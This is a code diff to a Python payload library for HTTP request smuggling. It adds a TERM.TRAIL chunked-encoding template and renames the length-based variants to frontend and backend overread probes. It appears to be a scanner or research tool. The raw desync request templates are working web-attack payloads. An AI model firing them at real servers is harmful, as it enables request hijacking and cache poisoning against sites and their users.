@@ -27,6 +27,11 @@ class Payload(ABC):
 
     @property
     @abstractmethod
+    def early_response_gadget_required(self):
+        pass
+
+    @property
+    @abstractmethod
     def ambiguous_line_terminators(self): 
         pass
 
@@ -35,8 +40,11 @@ class Payload(ABC):
     def payload_templ(self):
         pass
 
-    def get_pretty_name(self):
-        return self.pretty_name
+    def get_pretty_name(self, lt=None):
+        return self.pretty_name if lt is None else self.pretty_name + f" ({repr(lt)})"
+
+    def is_gadget_required(self):
+        return self.early_response_gadget_required
 
     def build(self, line_terminator="\n"):
         # construct a variant of the payload
@@ -51,13 +59,20 @@ class Payload(ABC):
 
     def build_all(self):
         # construct all variants of the payload
-        return [(repr(lt), self.build(line_terminator=lt)) for lt in self.ambiguous_line_terminators]
+        return (
+            (self.get_pretty_name(lt=lt), self.build(line_terminator=lt))
+            for lt in self.ambiguous_line_terminators
+        )
 
 
 class TERM_EXT(Payload):
     @property
     def pretty_name(self):
         return "TERM.EXT"
+
+    @property
+    def early_response_gadget_required(self):
+        return False
 
     @property
     def ambiguous_line_terminators(self):
@@ -90,6 +105,10 @@ class EXT_TERM(Payload):
         return "EXT.TERM"
 
     @property
+    def early_response_gadget_required(self):
+        return False
+
+    @property
     def ambiguous_line_terminators(self):
         return ["\n", "\r", "\rX", "\r\r"]
 
@@ -118,6 +137,10 @@ class TERM_SPILL(Payload):
     @property
     def pretty_name(self):
         return "TERM.SPILL"
+
+    @property
+    def early_response_gadget_required(self):
+        return False
 
     @property
     def ambiguous_line_terminators(self):
@@ -149,6 +172,10 @@ class SPILL_TERM(Payload):
         return "SPILL.TERM"
 
     @property
+    def early_response_gadget_required(self):
+        return False
+
+    @property
     def ambiguous_line_terminators(self):
         return ["\n", "\r", "", "XX", "\rX", "\r\r"]
 
@@ -172,10 +199,44 @@ class SPILL_TERM(Payload):
         )
 
 
-class ONE_TWO(Payload):
+class TERM_TRAIL(Payload):
     @property
     def pretty_name(self):
-        return "Length-based: ONE.TWO"
+        return "TERM.TRAIL"
+
+    @property
+    def early_response_gadget_required(self):
+        return True
+
+    @property
+    def ambiguous_line_terminators(self):
+        return ["\n", "\r", "\r\r"]
+
+    @property
+    def payload_templ(self):
+        return (
+            "{method} {path} HTTP/1.1\r\n"
+            "Host: {host}\r\n"
+            "Transfer-Encoding: chunked\r\n"
+            "{headers}"
+            "\r\n"
+            "2\r\n"
+            "XX\r\n"
+            "0\r\n"
+            "{line_terminator}"
+            "xxx: yyy\r\n"
+            "\r\n"
+        )
+
+
+class BACKEND_OVERREAD_1BYTE(Payload):
+    @property
+    def pretty_name(self):
+        return "1-byte backend overread"
+
+    @property
+    def early_response_gadget_required(self):
+        return False
 
     @property
     def ambiguous_line_terminators(self):
@@ -203,10 +264,14 @@ class ONE_TWO(Payload):
         )
 
 
-class TWO_ONE(Payload):
+class FRONTEND_OVERREAD_1BYTE(Payload):
     @property
     def pretty_name(self):
-        return "Length-based: TWO.ONE"
+        return "1-byte frontend overread"
+
+    @property
+    def early_response_gadget_required(self):
+        return False
 
     @property
     def ambiguous_line_terminators(self):
@@ -230,10 +295,14 @@ class TWO_ONE(Payload):
         )
 
 
-class ZERO_TWO(Payload):
+class BACKEND_OVERREAD_2BYTE(Payload):
     @property
     def pretty_name(self):
-        return "Length-based: ZERO.TWO"
+        return "2-byte backend overread"
+
+    @property
+    def early_response_gadget_required(self):
+        return False
 
     @property
     def ambiguous_line_terminators(self):
@@ -261,10 +330,14 @@ class ZERO_TWO(Payload):
         )
 
 
-class TWO_ZERO(Payload):
+class FRONTEND_OVERREAD_2BYTE(Payload):
     @property
     def pretty_name(self):
-        return "Length-based: TWO.ZERO"
+        return "2-byte frontend overread"
+
+    @property
+    def early_response_gadget_required(self):
+        return False
 
     @property
     def ambiguous_line_terminators(self):
